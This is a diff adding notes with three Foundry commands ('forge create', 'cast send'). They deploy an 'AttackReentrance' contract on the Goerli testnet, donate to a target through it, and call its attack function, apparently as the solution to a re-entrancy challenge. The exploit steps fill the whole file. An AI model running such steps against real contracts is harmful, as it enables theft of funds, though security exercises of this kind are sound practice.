@@ -1,0 +1,22 @@
+1. forge create src/10Re-entrancy/Solution.sol:AttackReentrance \
+ --rpc-url https://goerli.infura.io/v3/{key} \
+ --private-key {key} \
+ --constructor-args "0x8E7C371c60DaEd20a810EaCEFCeb4D2823b4eDD7" \
+ --etherscan-api-key {key} \
+ --verify 
+
+
+2. cast send 0xB8d9Bb7b72233622f7eF07E505EC15CB1F7b5a80 "donate()" \
+--value 0.001ether \
+--rpc-url https://goerli.infura.io/v3/{key} \
+--private-key {key} \
+--gas-limit 500000 \
+--gas-price 1gwei
+
+
+3. cast send 0xB8d9Bb7b72233622f7eF07E505EC15CB1F7b5a80 "attack(uint amount)" 0.001ether \
+--rpc-url https://goerli.infura.io/v3/{key} \
+--private-key {key} \
+--gas-limit 500000 \
+--gas-price 1gwei
+ 
